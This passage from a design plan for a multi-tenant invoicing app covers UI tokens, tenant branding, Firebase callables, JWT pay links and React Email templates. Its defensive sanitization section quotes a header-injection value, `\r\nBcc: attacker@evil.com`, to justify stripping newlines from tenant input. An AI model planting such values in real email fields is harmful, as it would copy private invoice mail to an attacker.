This phase lands the visual foundation **before** any Phase 2 UI work. Every form, button, dialog, toast, badge, and alert built from Phase 2 onward composes the primitives scaffolded here. Skipping or deferring this phase guarantees a Phase 3 rebuild — the current Vite app's patchy CSS (dual `cs-toast`/`inv-toast` systems, leaking `.form-group` margins, ad-hoc dropdown styles) is exactly the failure mode this prevents.

### Why shadcn/ui

- **Copy-paste, not a dependency.** Components live in `src/components/ui/` and are owned by us. No upstream version-lock, no breaking-change surprises, full edit access.
- **Built on Radix primitives** — accessibility (focus traps, ARIA, keyboard nav, screen-reader semantics) is correct by default, not an afterthought.
- **Semantic CSS-variable token system** — clean separation between platform tokens (locked) and tenant tokens (overridable).
- **Industry standard for Next.js + Tailwind SaaS in 2026.** Opus and Sonnet both know every component intimately, which speeds Phase 2/3 generation.

### Component scaffold list (scoped to Phase 2/3 needs only)

Install these now. Add others when a later phase actually consumes them — no speculative scaffolding.

| Component | Used by |
|---|---|
| `Button` | every form, every action |
| `Input`, `Label`, `Textarea` | all forms |
| `Form` (react-hook-form + zod wrapper) | signup, invoice form, settings, accept-invite |
| `Card`, `CardHeader`, `CardContent` | dashboard tiles, portal invoice list |
| `Dialog`, `AlertDialog` | confirm-destructive (delete invoice, revoke staff) |
| `Select`, `Checkbox`, `RadioGroup` | invoice form (HST toggle, recurring config), settings |
| `Badge` | invoice status (paid/unpaid/overdue/draft/cancelled) |
| `Alert` (with `destructive` variant) | inline form errors, validation summaries |
| `Sonner` (toast) | the single platform-wide toast system — replaces `cs-toast` + `inv-toast` |
| `Table` | invoice list, customer list, staff list |
| `DropdownMenu` | row actions, header user menu |
| `Tabs` | settings page sections |
| `Skeleton` | loading states (dashboard, portal invoice list) |
| `Separator` | visual dividers in cards |

Anything else (Command/Combobox, Calendar, Popover, Sheet, Accordion, etc.) gets added when its consuming phase needs it.

### Token system (full list)

shadcn ships these as CSS variables. They live in `src/app/globals.css` under `:root` (light) and `.dark` (dark). All Tailwind utility colors map to these tokens (`bg-background`, `text-muted-foreground`, etc.) — **no raw hex colors anywhere in component code.**

```
--background          /* page background */
--foreground          /* primary text */
--card                /* card surface */
--card-foreground
--popover             /* dropdown / dialog surface */
--popover-foreground
--primary             /* brand — TENANT OVERRIDABLE */
--primary-foreground  /* text on primary — computed from --primary contrast */
--secondary           /* secondary brand — TENANT OVERRIDABLE */
--secondary-foreground
--muted               /* subtle backgrounds (skeletons, hover states) */
--muted-foreground    /* secondary text */
--accent              /* hover surfaces */
--accent-foreground
--destructive         /* error red — PLATFORM LOCKED */
--destructive-foreground
--success             /* success green — PLATFORM LOCKED (custom add) */
--success-foreground
--warning             /* warning amber — PLATFORM LOCKED (custom add) */
--warning-foreground
--border              /* all borders */
--input               /* input border */
--ring                /* focus ring */
--radius              /* border radius scale */
```

`--success` and `--warning` are not in stock shadcn but are required for invoice status semantics — add them to the token file at install time.

### Tenant override scope (locked)

Tenants override **only** `--primary` and `--secondary`. Every other token stays platform-controlled.

```tsx
// src/app/(dashboard)/layout.tsx and src/app/(portal)/layout.tsx
<div
  style={{
    '--primary': tenant.primaryColor,
    '--primary-foreground': computeForeground(tenant.primaryColor),
    '--secondary': tenant.secondaryColor,
    '--secondary-foreground': computeForeground(tenant.secondaryColor),
  } as React.CSSProperties}
>
  {children}
</div>
```

**Why locked:** if tenants could override `--destructive`, error messages on one tenant's portal could end up green and silently misread as success. The same risk applies to `--success`, `--warning`, `--muted-foreground`, `--background`. Brand color belongs to the tenant; semantic meaning belongs to the platform. This matches the existing memory rule: "brand/semantic hues locked; opacity/legibility fixes on neutral whites are allowed."

### Contrast guard (validation + render fallback — both required)

Two layers, because either alone fails in a real edge case:

**Layer 1 — Validation at signup / settings save.** When a tenant picks `primaryColor` or `secondaryColor`, validate against WCAG AA contrast (≥ 4.5:1) on white background. Reject and show inline error if it fails. User must pick again.

```typescript
// src/lib/design/contrast.ts
export function meetsWcagAA(hex: string, against: string = '#FFFFFF'): boolean {
  return contrastRatio(hex, against) >= 4.5;
}
```

Wired into the signup wizard color picker and `settings/page.tsx` branding form. Server-side `updateTenantBranding` callable re-validates (never trust the client).

**Layer 2 — Computed `--foreground` at render.** Even with validation, edge cases exist (legacy tenants, future migrations, color picked against white but rendered on a dark surface). Always compute `--primary-foreground` as black or white based on the luminance of `--primary`:

```typescript
// src/lib/design/contrast.ts
export function computeForeground(hex: string): '#000000' | '#FFFFFF' {
  const luminance = relativeLuminance(hex);
  return luminance > 0.5 ? '#000000' : '#FFFFFF';
}
```

Belt + suspenders: validation prevents the bad input; computed fallback prevents an unreadable button if bad input ever slips through.

### Dark / light mode strategy (decision, not option)

| Surface | Mode | Why |
|---|---|---|
| Tenant admin dashboard (`/dashboard/*`) | **dark** | Matches current Vite app, less eye strain for daily power-user work, signals "tool" |
| Customer portal (`/portal/*`) | **light** | Higher trust for "pay this invoice," matches what homeowners expect from financial UIs, easier for accessibility |
| Branded login pages (`/portal/login`, tenant signup) | **light** | Public-facing, professional-first impression |
| Generated PDFs | **light** | Already light (printed/emailed documents) |

**No user toggle.** A toggle adds state to persist, doubles QA surface, and undermines the "portal = trustworthy/light, dashboard = working tool/dark" intent. If a user demands it later, it's a one-flag addition — easier to add than to remove.

Tailwind config: dashboard layout sets `<html className="dark">` server-side; portal layout omits it. No flash-of-wrong-theme because mode is a layout-level decision, not a client toggle.

### Font system

- **Platform default:** Inter, loaded via `next/font/google` in `src/app/layout.tsx`. Inter is shadcn's convention and renders cleanly at all sizes.
- **Tenant `fontFamily` override scope:** customer-facing surfaces only — portal pages and generated PDFs. The admin dashboard always renders in Inter regardless of tenant `fontFamily`.
- **Why scoped:** the dashboard is Reggie's app dressed in tenant branding for tenant staff; consistent font there reduces support burden. The portal and PDFs are what the tenant's customers see — full brand expression matters there.
- **Allowed tenant fonts:** curated list (Inter, Roboto, Open Sans, Lato, Montserrat, Poppins, Source Sans 3, Merriweather). All loaded via `next/font/google` with `display: 'swap'`. Free-text font input is not allowed (prevents broken renders, missing-font fallbacks, and supply-chain risk from arbitrary `@import` URLs).

### Toast system (single source — Sonner)

shadcn ships `Sonner` as the recommended toast. Use **only** Sonner across the entire platform. The current Vite app's dual `cs-toast` (CustomerSection) and `inv-toast` (InvoiceForm) pattern is the exact failure mode being eliminated.

```tsx
// src/app/layout.tsx
import { Toaster } from '@/components/ui/sonner';

<body>
  {children}
  <Toaster position="bottom-center" richColors closeButton />
</body>
```

Mounted once at the root layout. All components call `toast.success(...)` / `toast.error(...)` from `sonner`. No component-scoped toast state, no fixed-position manual divs.

### Status badge mapping (canonical)

Invoice and quote status badges use the shadcn `Badge` component with these variants (extend `Badge` variants in `src/components/ui/badge.tsx` to add `success`/`warning` mapped to the new tokens):

| Status | Variant | Token |
|---|---|---|
| `paid` | `success` | `--success` |
| `unpaid` | `default` | `--primary` |
| `overdue` | `destructive` | `--destructive` |
| `cancelled` | `secondary` | `--muted` |
| `draft` | `outline` | `--border` |
| `sent` | `default` | `--primary` |

Centralized in `src/lib/invoices/statusBadge.ts` as `getStatusBadgeProps(status)`. Never inline status → color logic at the call site.

**Note on `unpaid` (intentional departure from the old Vite app):** the old app showed unpaid invoices in red, which was aggressive — it alarmed tenants about invoices that weren't even overdue yet. The new mapping reserves red (`destructive`) for `overdue` only, where it carries real signal. `unpaid` uses the tenant's brand color (`--primary`) as a neutral "awaiting payment" state. This matches the Stripe Dashboard, QuickBooks, and FreshBooks conventions. The transition `unpaid → overdue` happens automatically when `Date.now() > invoice.dueDate`, triggered by a scheduled Cloud Function or computed at read time — implementation detail for Phase 2.

### Composition rule

shadcn primitives (`Button`, `Input`, `Card`, etc.) live in `src/components/ui/` and are **never modified except to add token bindings**. Domain components (`InvoiceForm`, `LineItemEditor`, `RecurringConfig`, `PortalInvoiceList`, `SignupWizard`, etc.) live in `src/components/invoices/`, `src/components/portal/`, etc. and **compose** the ui primitives.

Rule: **no domain component reaches for raw HTML form elements or Tailwind color utilities with hex values.** If `Input` doesn't do what you need, extend `Input` in `src/components/ui/input.tsx` — don't write a one-off in the domain component.

### Phase 1.5 deliverables checklist

- [ ] `npx shadcn@latest init` run, base `globals.css` + `tailwind.config.ts` + `components.json` committed
- [ ] All 14 scoped components scaffolded into `src/components/ui/`
- [ ] `--success` and `--warning` tokens added to `globals.css` (light + dark)
- [ ] `Badge` variants extended with `success` and `warning`
- [ ] `src/lib/design/contrast.ts` with `meetsWcagAA()` + `computeForeground()` + unit tests
- [ ] `src/lib/invoices/statusBadge.ts` with canonical status → variant mapping
- [ ] Dashboard layout sets `<html className="dark">`; portal layout sets light
- [ ] Inter loaded via `next/font/google` in root layout
- [ ] Curated tenant font list defined in `src/lib/design/fonts.ts` with `next/font` loaders
- [ ] `Toaster` mounted once in root layout; all toast calls use `sonner`
- [ ] Tenant override pattern (`--primary`/`--secondary` only, with computed `--primary-foreground`) wired in dashboard + portal layouts
- [ ] One reference page (e.g., `/dashboard/style-guide`, dev-only, gated by env) renders every primitive in light + dark + with a sample tenant override, for visual regression review

**Estimated effort:** 2 days

---

## Phase 2 — Cloud Functions Rewrite

### Core patterns

Every callable function follows this shape:
```typescript
export const someFunction = onCall(async (request) => {
  const tenantId = request.auth?.token.tenantId;
  if (!tenantId) throw new HttpsError('unauthenticated', 'No tenant');

  await requireFeature(tenantId, 'quotes');  // if feature-gated

  // do work scoped to tenants/{tenantId}/...
});
```

### `requireFeature()` helper

```typescript
import { DEFAULT_FEATURES, resolveFeatures, FeatureKey } from '../shared/features';

async function requireFeature(tenantId: string, key: FeatureKey) {
  const snap = await db.doc(`tenants/${tenantId}/entitlements`).get();
  const features = resolveFeatures(snap.data());
  if (!features[key]) {
    throw new HttpsError('permission-denied',
      `Feature '${key}' not enabled for this tenant.`);
  }
}
```

### Functions to rewrite (with feature gates)

**Tenant-facing (require `tenantId` claim):**

| Function | Feature Gate |
|---|---|
| `createInvoice` / `consumeInvoiceNumber` | `invoices` (always true) |
| `updateInvoice` | `invoices` |
| `deleteInvoice` | `invoices` |
| `markInvoicePaid` (manual mark, separate from Stripe webhook) | `invoices` |
| `sendInvoiceEmail` | `invoices` |
| `previewInvoicePDF` | `invoices` |
| `createQuote` / `consumeQuoteNumber` | `quotes` |
| `updateQuote` | `quotes` |
| `deleteQuote` | `quotes` |
| `sendQuoteEmail` | `quotes` |
| `previewQuotePDF` | `quotes` |
| `convertQuoteToInvoice` | `quotes` AND `invoices` |
| `regenerateInvoicePayLink` (invalidates prior tokens, issues a new one — owner/admin only) | `invoices` |
| `updateTenantBranding` (primaryColor, secondaryColor, logoUrl, fontFamily, etc. — re-validates WCAG contrast server-side) | none |
| `updatePaymentSettings` (etransferEmail, chargeCustomerCardFees, cardFeePercent, surchargeAcknowledgedAt — caps cardFeePercent at 2.4 server-side regardless of client input) | none |
| `updateUserProfile` (whitelisted fields: displayName, phone) | none |
| `createRecurringInvoice` | `recurringInvoices` |
| `processRecurringInvoices` (scheduled) | `recurringInvoices` (per-tenant check inside loop) |
| `createCheckoutSession` (tenant-initiated, e.g. charging a saved customer) | `stripePayments` |
| `onSignup` (create tenant + entitlements + user) | none |
| `setUserRole` (owner/admin only) | none |
| `createInvitation` (owner/admin invites staff) | none (owner/admin role check inside) |
| `onAcceptInvite` (invitee accepts, sets claims) | none (token + email match inside) |

**Customer-facing (require `email_verified`, NO `tenantId` claim):**

| Function | Feature Gate | Auth Pattern |
|---|---|---|
| `getCustomerInvoices` | `invoices` of target tenant | `email_verified == true`, returns invoices across all tenants where `customer.email` matches caller |
| `getCustomerInvoiceDetail` | `invoices` of target tenant | Verify caller email matches invoice's `customer.email` before returning |
| `downloadInvoicePDF` (customer-side variant) | `invoices` of target tenant | Verify caller email matches invoice's `customer.email`, stream PDF bytes |

**Note:** There is intentionally no `payInvoice` callable. All payment paths — email link, portal "Pay Now" button, manual pay link copied by the tenant — route through `createPayTokenCheckoutSession` (token-authenticated, no Firebase auth required). The portal just discovers the pay link for logged-in customers; it does not create a parallel payment path. One checkout-creation codepath = one place to audit, one place to apply surcharge/rate-limit/version-check logic.

**Token-authenticated (no Firebase auth — token is the auth):**

| Function | Feature Gate | Auth Pattern |
|---|---|---|
| `verifyInvoicePayToken` | `invoices` of target tenant | Verifies JWT signature + expiry + `payTokenVersion` match. Returns invoice summary (amount, tenant branding, line items) for rendering the public pay page. No Firebase auth required — the signed token IS the auth for this one action. |
| `createPayTokenCheckoutSession` | `stripePayments` of target tenant | Re-verifies JWT (never trust a prior verify), creates Stripe Checkout session on tenant's Connect account, applies surcharge line item if `chargeCustomerCardFees === true` and card is chosen. Rate-limited per invoice (max 10 checkout sessions per invoice per 24h to prevent abuse). |

**Infrastructure (no auth — runs under Firebase Admin SDK):**

| Function | Notes |
|---|---|
| `stripeWebhook` | Routes by Stripe `account` field → tenant lookup → invoice update. See Phase 4. |
| `scheduledFirestoreExport` | Daily backup to Cloud Storage. See Backup section. |

### Invoice/quote CRUD pattern (admin-SDK only — C1 fix)

All invoice and quote mutations go through dedicated callables. Direct client writes are blocked by Firestore rules. This is the C1 fix from the round 3 audit and removes the entire `tenantSnapshot`-forgery and field-tamper class of bugs.

**Standard create/update shape:**
```typescript
export const createInvoice = onCall(async (request) => {
  const tenantId = request.auth?.token.tenantId;
  if (!tenantId) throw new HttpsError('unauthenticated', 'No tenant');
  await requireFeature(tenantId, 'invoices');

  const input = validateInvoiceInput(request.data);  // schema validation

  // C2 fix — lowercase email at the write boundary, ALWAYS.
  const customerEmail = String(input.customer.email || '').trim().toLowerCase();
  if (!customerEmail) throw new HttpsError('invalid-argument', 'Email required');

  // Snapshot current tenant branding (frozen legal document)
  const meta = (await db.doc(`tenants/${tenantId}/meta`).get()).data();

  // Inline the logo as a base64 data URL so the invoice survives future logo
  // rotations/deletions. See Phase 6 "Immutable logo snapshot" for rationale.
  const logoDataUrl = meta.logoUrl ? await inlineLogoOrThrow(meta.logoUrl) : null;

  const tenantSnapshot = {
    version: 1,                        // P2 fix — schema-version snapshots
    name: meta.name, logo: logoDataUrl, address: meta.address,
    primaryColor: meta.primaryColor, secondaryColor: meta.secondaryColor,
    fontFamily: meta.fontFamily, faviconUrl: meta.faviconUrl,
    taxRate: meta.taxRate, taxName: meta.taxName,
    businessNumber: meta.businessNumber, emailFooter: meta.emailFooter,
    currency: meta.currency,
  };

  // Server computes totals — never trust client math
  const totals = computeInvoiceTotals(input.lineItems, meta.taxRate, input.applyTax);

  // Atomic: counter increment + invoice create in one transaction
  const invoiceId = await db.runTransaction(async (tx) => {
    const counterRef = db.doc(`tenants/${tenantId}/counters/invoiceCounter`);
    const counterSnap = await tx.get(counterRef);
    const next = (counterSnap.exists ? counterSnap.data().count : 0) + 1;
    tx.set(counterRef, { count: next }, { merge: true });

    const id = `${meta.invoicePrefix}-${String(next).padStart(4, '0')}`;
    tx.set(db.doc(`tenants/${tenantId}/invoices/${id}`), {
      ...input,
      customer: { ...input.customer, email: customerEmail },
      tenantSnapshot,
      totals,
      status: 'draft',
      createdAt: FieldValue.serverTimestamp(),
      createdBy: request.auth.uid,
    });
    return id;
  });

  return { invoiceId };
});
```

**`updateInvoice`** accepts only mutable fields (line items, customer details, status) — **never `tenantSnapshot`, `createdAt`, `tenantId`, `tenantSnapshot.taxRate`, or computed totals**. Server recomputes totals on every update. If the customer email changes, lowercase it again.

**`deleteInvoice`** is a hard delete for MVP (soft-delete UI deferred). Owner/admin role required.

**`markInvoicePaid`** is a manual fallback for cases where payment happened outside Stripe (cash, e-transfer). Sets `status: 'paid', paidAt: serverTimestamp(), paymentMethod: 'manual' | 'etransfer' | 'cash'`. Owner/admin only. Stripe webhook does the same thing for online payments — they're separate code paths intentionally. **Important:** on transition to `paid`, the invoice's pay token is implicitly invalidated by the verify path checking `status !== 'paid'` before accepting a checkout attempt. No need to rotate the token itself.

Same shape for `createQuote` / `updateQuote` / `deleteQuote`. `convertQuoteToInvoice` (below) reuses the snapshot + counter logic.

### Invoice pay-link generation and verification

**At invoice creation (`createInvoice` callable, after counter write, before return):**

```typescript
import { sign } from 'jsonwebtoken';
import { defineSecret } from 'firebase-functions/params';

const PAY_TOKEN_SECRET = defineSecret('PAY_TOKEN_SECRET');

// ... inside createInvoice transaction ...
const payTokenExpiresAt = Timestamp.fromMillis(Date.now() + 60 * 24 * 60 * 60 * 1000); // 60 days
const payTokenVersion = 1;
const payToken = sign(
  { invoiceId: id, tenantId, v: payTokenVersion },
  PAY_TOKEN_SECRET.value(),
  { expiresIn: '60d' }
);
tx.update(invoiceRef, { payToken, payTokenExpiresAt, payTokenVersion });
```

**`verifyInvoicePayToken` callable (public, no Firebase auth):**

Returns a **structured status object** rather than throwing on "already paid" or "regenerated." The pay page (and the post-checkout success page which polls this) needs to BRANCH on the status, not catch errors and pattern-match on messages (P1 — string-matched error flow is fragile). Only token-shape failures (invalid signature, expired JWT, missing invoice) throw — those are genuine "cannot continue" states.

```typescript
type VerifyResult =
  | { outcome: 'ok'; invoice: PayPagePayload }                          // ready to pay
  | { outcome: 'paid'; paidAt: number; invoiceNumber: string }          // already paid
  | { outcome: 'refunded'; refundedAt: number; invoiceNumber: string }  // refunded after payment
  | { outcome: 'regenerated' }                                          // newer link exists
  | { outcome: 'not-available' };                                       // draft/archived/deleted

export const verifyInvoicePayToken = onCall({ secrets: [PAY_TOKEN_SECRET] }, async (request): Promise<VerifyResult> => {
  const { token } = request.data;
  if (!token || typeof token !== 'string') {
    throw new HttpsError('invalid-argument', 'Token required');
  }

  let payload: { invoiceId: string; tenantId: string; v: number };
  try {
    // JWT verify checks signature AND exp claim. Expiry is enforced here,
    // NOT against the Firestore payTokenExpiresAt field — see P3 note below.
    payload = verify(token, PAY_TOKEN_SECRET.value()) as any;
  } catch {
    throw new HttpsError('permission-denied', 'Invalid or expired pay link');
  }

  const invoiceRef = db.doc(`tenants/${payload.tenantId}/invoices/${payload.invoiceId}`);
  const snap = await invoiceRef.get();
  if (!snap.exists) throw new HttpsError('not-found', 'Invoice not found');

  const invoice = snap.data()!;

  // Structured-status branching — these are legitimate states the pay page must render,
  // not errors. Throwing and catching on the client would be fragile (P1 fix).
  if (invoice.deletedAt) return { outcome: 'not-available' };
  if (invoice.payTokenVersion !== payload.v) return { outcome: 'regenerated' };
  if (invoice.status === 'refunded' || invoice.status === 'partially-refunded') {
    return {
      outcome: 'refunded',
      refundedAt: invoice.refundedAt?.toMillis?.() ?? 0,
      invoiceNumber: invoice.invoiceNumber,
    };
  }
  if (invoice.status === 'paid') {
    return {
      outcome: 'paid',
      paidAt: invoice.paidAt?.toMillis?.() ?? 0,
      invoiceNumber: invoice.invoiceNumber,
    };
  }
  // P4 — allow-list payable statuses. Draft/archived invoices must NOT be payable
  // even if a tenant accidentally shared the pay link (e.g. pasted it in chat to
  // preview, then edited the draft). Only 'sent', 'unpaid', 'overdue', 'partial'
  // are accepted payment targets.
  const PAYABLE_STATUSES = ['sent', 'unpaid', 'overdue', 'partial'] as const;
  if (!PAYABLE_STATUSES.includes(invoice.status)) {
    return { outcome: 'not-available' };
  }

  // Return minimal payload for rendering the public pay page.
  return {
    outcome: 'ok',
    invoice: {
      invoiceId: payload.invoiceId,
      tenantId: payload.tenantId,
      invoiceNumber: invoice.invoiceNumber,
      customer: { name: invoice.customer.name, email: invoice.customer.email },
      lineItems: invoice.lineItems,
      totals: invoice.totals,
      status: invoice.status,
      tenantSnapshot: invoice.tenantSnapshot,
      chargeCustomerCardFees: Boolean(invoice.tenantSnapshot.chargeCustomerCardFees),
      cardFeePercent: invoice.tenantSnapshot.cardFeePercent ?? 0,
      etransferEmail: invoice.tenantSnapshot.etransferEmail ?? null,
    },
  };
});
```

**Pay page branches on `outcome`:** `ok` → render pay UI; `paid` → "Thanks, this invoice was paid on {date}"; `refunded` → "This invoice was refunded on {date}"; `regenerated` → "This pay link is no longer valid. Check your email for a newer invoice, or contact {tenant.name}."; `not-available` → generic "This invoice is not currently available for payment. Contact {tenant.name} if you believe this is an error." The success page at `/pay/[token]/success` polls with backoff (max 5 attempts, 1s apart) until it sees `outcome === 'paid'` — no string matching required.

**P3 — JWT `exp` is the authoritative expiry.** The `payTokenExpiresAt` Firestore timestamp is **display-only** (used in the dashboard to show tenants "this invoice's pay link expires in N days" and in the `regenerateInvoicePayLink` CTA logic). The `verify()` call enforces expiry via the JWT `exp` claim — if the two ever diverge (manual Firestore edit, clock skew, migration bug), the JWT wins because that's what the verify path actually checks. Do not add code that reads `payTokenExpiresAt` for authorization decisions.

Note: `chargeCustomerCardFees`, `cardFeePercent`, and `etransferEmail` must be added to the `tenantSnapshot` write in `createInvoice` so the pay page can render them without a second meta read.

**`regenerateInvoicePayLink`** (owner/admin callable) — increments `payTokenVersion`, signs a new JWT, overwrites `payToken` and `payTokenExpiresAt`. Useful when a customer accidentally forwards the email or a tenant wants to kill an old link.

**Race-condition guarantee (C2):** a customer can have a Stripe Checkout session already open at the moment of regeneration — Stripe Checkout sessions live for 24 hours after creation and can be completed at any point. The session's `metadata.payTokenVersion` is frozen at session-creation time. The webhook (Phase 4) detects this mismatch and auto-refunds. `regenerateInvoicePayLink` itself does NOT need to call `stripe.checkout.sessions.expire()` — letting the webhook handle it keeps the race-guard logic in one place (the webhook) instead of two (regenerate + webhook), and correctly handles the case where the customer was literally in the middle of typing their card number when regenerate fired.

### React Email + Resend — transactional email system

**All outgoing emails use React Email templates rendered server-side in Cloud Functions, sent through Resend.**

Reasoning: email clients render HTML/CSS wildly differently (Gmail strips styles, Outlook mangles tables, Apple Mail auto-inverts in dark mode). React Email is a component library specifically built for cross-client compatibility — it handles the inline-CSS and dark-mode meta-tag mechanics so templates don't break in production. Without a shared template system, every email-sending function will hand-roll its own HTML and the platform ends up with the email equivalent of the old Vite app's dual `cs-toast`/`inv-toast` problem.

**Package layout:**

```
functions/
  emails/
    components/
      TenantEmailLayout.tsx    ← shared shell: <Html>, <Head>, header w/ logo, footer, color-scheme meta
      Button.tsx               ← primary CTA, tenant primaryColor with computed foreground
      Divider.tsx
    templates/
      InvoiceSent.tsx          ← "Acme sent you an invoice" — primary CTA: "Pay Invoice" (direct pay link)
      PaymentReceipt.tsx       ← "Payment received" — receipt summary, link to portal
      MagicLinkSignIn.tsx      ← portal magic-link email
      StaffInvite.tsx          ← staff invitation email (Phase 5 invitation flow)
      QuoteSent.tsx            ← "Acme sent you a quote" — CTA: "View Quote" → portal
      RecurringInvoiceSent.tsx ← "Your monthly invoice from Acme is ready"
    send.ts                    ← Resend client wrapper with from/replyTo conventions
```

**`<TenantEmailLayout>` contract (the shell every email composes):**

```tsx
interface TenantEmailLayoutProps {
  tenantSnapshot: TenantSnapshot;   // pulled from the invoice/quote doc being referenced,
                                    // OR from meta for non-document emails (magic link, invite)
  preview: string;                  // preview text shown in inbox list
  children: React.ReactNode;        // the specific template body
}
```

Every template renders inside this layout. Header includes the tenant logo (max-height 60px, max-width 200px — enforced in CSS so tall logos can't push content off-screen). Footer includes tenant name, address, and `emailFooter` text. Color-scheme meta tags (`color-scheme: light` + `supported-color-schemes: light`) are set in `<Head>` to prevent Apple Mail / Outlook dark-mode auto-inversion, which is the #1 source of unreadable email rendering.

**Email design principles (enforced by convention + code review, not lint):**

1. **Single-column layout, 600px max width.** Multi-column breaks in half of email clients.
2. **One primary CTA button.** Never two competing buttons. Secondary actions are small text links.
3. **Logo max 200×60px.** Constrained in the layout so tenant logos of wild aspect ratios stay in bounds.
4. **System fonts only** — Arial/Helvetica/sans-serif stack. No web fonts in email (they fail in ~50% of clients). This is independent of the tenant's `fontFamily` for web/PDF.
5. **Tenant `primaryColor` used on the CTA button only.** Body text stays black on white. Over-coloring is the single biggest "looks cheap" signal.
6. **Contrast guard applies** — CTA button foreground computed with `computeForeground(tenant.primaryColor)` from Phase 1.5.
7. **Plain-text fallback** auto-generated by React Email. Required for spam-filter compliance (SpamAssassin penalizes HTML-only email).
8. **From / Reply-To convention:** `From: "Acme Plumbing" <invoices@techflow.app>`, `Reply-To: tenant's business email from meta`. Sending from the platform domain maintains SPF/DKIM/DMARC alignment; Reply-To sends the customer's response to the tenant.
9. **No "unsubscribe" link on transactional email.** These are transactional (invoice you owe), not marketing. CAN-SPAM and CASL both exempt transactional. Adding an unsubscribe link incorrectly signals this is marketing and hurts deliverability.

**P2 — `previewText` convention (mandatory per template).** Email clients (Gmail, Apple Mail, Outlook mobile) show preview text as a second line under the subject in the inbox list. Default (nothing) pulls from the first rendered text, which reads like garbage ("Hi Jane, Acme..."). Each template MUST define its own preview string tuned for inbox scanning — this is prime-real-estate marketing copy and directly drives open rates.

Convention: each template exports a `buildPreviewText(props)` function returning a short (80–110 char) string. Examples:

- **InvoiceSent** — `\`Invoice #\${invoiceNumber} from \${tenant.name} — $\${total} due \${dueDate}\`` → `"Invoice #INV-0042 from Acme Plumbing — $524.30 due Apr 27"`
- **PaymentReceipt** — `\`Thanks for your $\${amount} payment to \${tenant.name}\`` → `"Thanks for your $524.30 payment to Acme Plumbing"`
- **MagicLinkSignIn** — `\`Your sign-in link for the \${tenant.name} portal\`` → `"Your sign-in link for the Acme Plumbing portal"`
- **StaffInvite** — `\`\${inviter.name} invited you to join \${tenant.name} on TechFlow\``
- **QuoteSent** — `\`Quote #\${quoteNumber} from \${tenant.name} — $\${total}, valid until \${validUntil}\``
- **RecurringInvoiceSent** — `\`Your \${frequency} invoice from \${tenant.name} is ready — $\${total}\``

Pass the result as the `preview` prop to `<TenantEmailLayout>`. Do not leave blank.

**InvoiceSent email content (the most important one):**

- Header: tenant logo
- Greeting: "Hi {customer.firstName}"
- One sentence: "{tenant.name} has sent you an invoice for ${total}."
- Large primary CTA button: **"Pay Invoice"** → `https://{platformDomain}/pay/{payToken}` (or `https://{customDomain}/pay/{payToken}` if tenant has custom domain)
- Small secondary text link: "Or view in your customer portal" → `/portal/login`
- Invoice summary (collapsed): invoice number, issue date, due date, total
- Footer: tenant name, address, `emailFooter` text, "Questions? Reply to this email"
- **What's NOT in the email:** full line-item breakdown, payment terms essay, promotional footer content, multiple CTAs. Line items go in the PDF attachment and the pay page. The email is the envelope, not the document.

**Email sending convention:** every `sendXxxEmail` function (or inline send call from another function) goes through `emails/send.ts` which enforces the from/replyTo convention and adds idempotency keys to prevent duplicate sends on retry.

**R4 — Tenant input sanitization before template render (mandatory).** Tenant-controlled string fields flow into email templates: `tenantSnapshot.name`, `tenantSnapshot.address`, `tenantSnapshot.emailFooter`, `tenantSnapshot.email` (used as `replyTo`), plus customer-side fields like `customer.name`. React Email escapes content via JSX by default (XSS is handled), BUT two risks remain:

1. **Header smuggling via `replyTo`.** If `tenantSnapshot.email` contains `\r\nBcc: attacker@evil.com`, the Resend SDK may or may not sanitize — we don't rely on that. Sanitize at our layer.
2. **Plain-text fallback channel.** React Email auto-generates plain-text from the JSX tree. Tenant-controlled newlines in `emailFooter` can inject content that reads like legitimate email body text to a reply-chain or forwarded email.

Implementation — `functions/emails/sanitize.ts`:

```typescript
export function sanitizeEmailField(input: string | null | undefined, maxLen: number): string {
  if (!input) return '';
  // Strip CR/LF (header injection), NUL, and other control chars except tab.
  const stripped = String(input).replace(/[\r\n\0\x01-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
  // Collapse runs of whitespace, trim, cap length.
  return stripped.replace(/\s+/g, ' ').trim().slice(0, maxLen);
}

// Usage — always sanitize tenant-controlled strings before passing to templates:
const safeName = sanitizeEmailField(tenantSnapshot.name, 100);
const safeAddress = sanitizeEmailField(tenantSnapshot.address, 300);
const safeFooter = sanitizeEmailField(tenantSnapshot.emailFooter, 500);
const safeReplyTo = sanitizeEmailField(tenantSnapshot.email, 200);
// (Additionally validate safeReplyTo matches an email regex before using — reject if not.)
```

Enforcement: `emails/send.ts` accepts only sanitized props. Raw tenant strings never reach Resend's SDK or the template render. PR review rule: **no `dangerouslySetInnerHTML` in any file under `functions/emails/` — full stop.** This is a hard convention enforced at code-review time; if a future template legitimately needs raw HTML (e.g. rich-text customer notes), revisit with a specific sanitization library (`isomorphic-dompurify`).

### `convertQuoteToInvoice` — detail

Reads a quote document, creates a new invoice document in the same tenant with:
- Same customer
- Same line items (hourly services + line items)
- Same totals and tax settings
- New invoice number from `tenants/{tenantId}/counters/invoiceCounter`
- Fresh `tenantSnapshot` (in case branding changed since quote was created)
- Link back to the source quote: `sourceQuoteId: quoteId`
- Marks the source quote as `status: 'converted'` and stores `convertedToInvoiceId`

Feature gate: must have BOTH `quotes` AND `invoices` enabled. If a tenant's `invoices` flag were ever false, they couldn't convert (shouldn't happen since `invoices` is a core feature, but the check is defensive).

Transactional: the quote status update and the invoice creation happen in a single Firestore transaction so a partial failure can't leave an orphan or a double-conversion.

### Customer function auth pattern

Customer-facing callables use this shape (no `tenantId` in the token):

```typescript
export const getCustomerInvoices = onCall(async (request) => {
  const rawEmail = request.auth?.token.email;
  const emailVerified = request.auth?.token.email_verified;
  if (!rawEmail || !emailVerified) {
    throw new HttpsError('unauthenticated', 'Customer email not verified');
  }
  // C2 fix — lowercase BEFORE querying. Invoices are stored with
  // lowercased customer.email, so the comparison must match.
  const email = String(rawEmail).toLowerCase();

  // collectionGroup query using admin SDK (bypasses rules, safe because we
  // enforce the email match here in code)
  const snap = await db.collectionGroup('invoices')
    .where('customer.email', '==', email)
    .orderBy('createdAt', 'desc')
    .limit(100)
    .get();

  return snap.docs.map(d => ({ id: d.id, path: d.ref.path, ...d.data() }));
});
```

Customer-facing payment creation is NOT a separate callable. The portal's "Pay Now" button resolves the invoice's current `payToken` (via `getCustomerInvoiceDetail`) and redirects the customer to `/pay/{payToken}`, which is the same public pay route reached from the email. The token-authenticated `createPayTokenCheckoutSession` callable handles Stripe session creation from there — one codepath, one set of guards.

### Invoice numbering
